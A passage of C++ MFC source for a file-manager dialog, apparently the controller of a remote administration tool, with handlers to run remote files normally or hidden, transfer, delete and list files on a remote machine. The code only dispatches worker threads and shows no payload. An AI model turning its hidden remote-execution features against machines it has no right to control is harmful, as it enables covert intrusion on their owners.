    // TODO: Add your command handler code here
    if (m_hWorkThread != NULL)
        return;

    m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::FileExecNormal);

    if (m_hWorkThread == NULL)
        StatusTextOut(0, "打开文件失败");
}

void CFileDlg::OnFileRunhide()
{
    // TODO: Add your command handler code here
    if (m_hWorkThread != NULL)
        return;

    m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::FileExecHide);

    if (m_hWorkThread == NULL)
        StatusTextOut(0, "隐藏打开文件失败");
}

void CFileDlg::OnFileCopy()
{
    // TODO: Add your command handler code here
    if (m_hWorkThread != NULL)
        return;

    bCopySel = TRUE;
    m_CopyPath = m_SendPath;
}

void CFileDlg::OnFilePaste()
{
    // TODO: Add your command handler code here
    if (m_hWorkThread != NULL)
        return;

    if (!bCopySel)
        return;
    bCopySel = FALSE;

    m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::FilePaste);

    if (m_hWorkThread == NULL)
        StatusTextOut(0, "复制粘贴文件失败");
}

void CFileDlg::OnFileDelete()
{
    // TODO: Add your command handler code here
    if (m_hWorkThread != NULL)
        return;

    m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::FileDelete);

    if (m_hWorkThread == NULL)
        StatusTextOut(0, "删除文件失败");
}

void CFileDlg::OnFileUpload()
{
    // TODO: Add your command handler code here
    if (m_hWorkThread != NULL)
        return;

    m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::FileUpLoad);

    if (m_hWorkThread == NULL)
        StatusTextOut(0, "上传文件失败");
}

void CFileDlg::OnFileDownload()
{
    // TODO: Add your command handler code here
    if (m_hWorkThread != NULL)
        return;

    m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::FileDownLoad);

    if (m_hWorkThread == NULL)
        StatusTextOut(0, "下载文件失败");
}

void CFileDlg::OnFileRefursh()
{
    // TODO: Add your command handler code here
    if (m_hWorkThread != NULL)
        return;

    //拼接列举路径
    m_SendPath = m_CurrPath + "\\*";

    //列举目录
    m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::ListDirectory);

    if (m_hWorkThread == NULL)
        StatusTextOut(0, "获取远程目录列表失败");
}

void CFileDlg::OnBtnAddrGo()
{
    // TODO: Add your control notification handler code here
    UpdateData();
    OnFileRefursh();
}

void CFileDlg::OnColumnclickFilelist(NMHDR* pNMHDR, LRESULT* pResult)
{
    NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
    // TODO: Add your control notification handler code here

    *pResult = 0;
}
